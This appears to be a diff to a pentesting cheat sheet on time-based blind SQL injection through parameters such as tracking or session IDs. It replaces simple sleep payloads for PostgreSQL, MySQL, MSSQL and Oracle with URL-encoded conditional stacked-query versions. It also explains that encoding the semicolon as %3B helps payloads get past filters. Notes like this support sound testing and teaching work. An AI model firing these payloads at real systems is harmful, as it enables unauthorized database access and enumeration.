@@ -19,22 +19,27 @@ The paramter can be a trackingID, sessionID etc...
 
 ```sql
 -- PostgreSQL
-'||pg_sleep(10)--
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
 
 -- MySQL / MariaDB
-' OR SLEEP(10)#
+'%3BSELECT+IF(1=1,SLEEP(10),SLEEP(0))#
 
 -- Microsoft SQL Server (MSSQL)
-'; WAITFOR DELAY '0:0:10'--
+'%3BIF(1=1)+WAITFOR+DELAY+'0:0:10'--
 
 -- Oracle
-' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('ADS', 10)--
-
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+DBMS_PIPE.RECEIVE_MESSAGE('ADS',10)+ELSE+NULL+END+FROM+DUAL--
 
 /*
 since blind sqli don't return visible results so
 the payloads are designed to ask true/false questions using time delay and 
 based on that we can perform database enumeration.
-In the above payloads 10 means 10 seconds.
+If the payload statement is true then wait for 10 seconds else no waiting. The time is in seconds.
+
+%3B means ; (semicolon) 
+Use `%3B` instead of `;` because `;` is a special character in URLs and may be blocked, split, or misinterpreted by servers or filters. Encoding it as `%3B` ensures it is safely transmitted and reaches the database reliably.
+You can also write (;) and then select the entire payload and click URL encoding option.
 */
 ```
+
+
